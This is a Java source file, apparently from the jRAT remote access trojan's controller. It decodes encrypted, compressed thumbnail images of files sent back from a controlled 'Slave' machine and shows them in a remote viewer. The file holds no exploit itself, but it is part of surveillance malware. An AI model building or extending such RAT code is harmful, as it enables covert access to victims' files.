package io.jrat.client.packets.incoming;

import io.jrat.client.Slave;
import io.jrat.client.ui.frames.FrameRemoteThumbView;
import io.jrat.client.utils.ImageUtils;
import io.jrat.common.compress.GZip;
import io.jrat.common.crypto.Crypto;

import java.awt.Graphics;
import java.awt.image.BufferedImage;
import java.io.DataInputStream;


public class Packet59ThumbnailPreview extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		FrameRemoteThumbView frame = FrameRemoteThumbView.instances.get(slave);

		String path = slave.readLine();
		int imageSize = dis.readInt();

		int w = 150;
		int h = 100;

		BufferedImage image = new BufferedImage(w, h, BufferedImage.TYPE_INT_RGB);

		Graphics imageGraphics = image.getGraphics();

		byte[] buffer = new byte[imageSize];
		slave.getDataInputStream().readFully(buffer);

		buffer = Crypto.decrypt(GZip.decompress(buffer), slave.getConnection().getKey());

		if (frame != null) {
			BufferedImage img = ImageUtils.decodeImage(buffer);
			imageGraphics.drawImage(img, 0, 0, w, h, null);
			frame.addImage(path, image);
			frame.setProgress(frame.getProgress() + 1);
		}
	}

}
